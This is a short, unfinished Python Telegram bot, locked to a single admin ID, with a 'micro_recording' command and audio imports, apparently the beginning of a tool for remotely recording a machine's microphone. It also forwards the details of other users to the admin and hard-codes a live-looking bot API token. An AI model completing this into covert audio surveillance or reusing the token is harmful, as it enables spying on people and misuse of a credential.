import telebot
import pyaudio
import wave

from cfg import *

API_TOKEN = "6466690541:AAFfFWUqEbEzZfIOuybgrqHot_hJYBiI-eI"
ADMIN = 804011643

bot = telebot.TeleBot(API_TOKEN)

def checkID(ms):
    if ms.from_user.id == ADMIN:
        return True
    else:
        info = f"""
        Name - {ms.from_user.first_name}
        Surname - {ms.from_user.last_name}
        UserName - {ms.from_user.username}
        Language - {ms.from_user.language_code}
        """
        bot.send_message(ADMIN, "USED:")
        bot.send_message(ADMIN, info)
        return False

@bot.message_handler(commands=["start", "help"])
def send_welcome(ms):
    if checkID(ms):
        bot.send_message(ADMIN, cmd)
        
@bot.message_handler(commands=["micro_recording"])
def micro_recording_first(ms):
    if checkID():
        bot.send_message(ADMIN, "Enter time...")
        
        @bot.message_handler(content_types=["text"])
        def micro_recording_last(ms):
            time = int(ms.text)
            

bot.infinity_polling()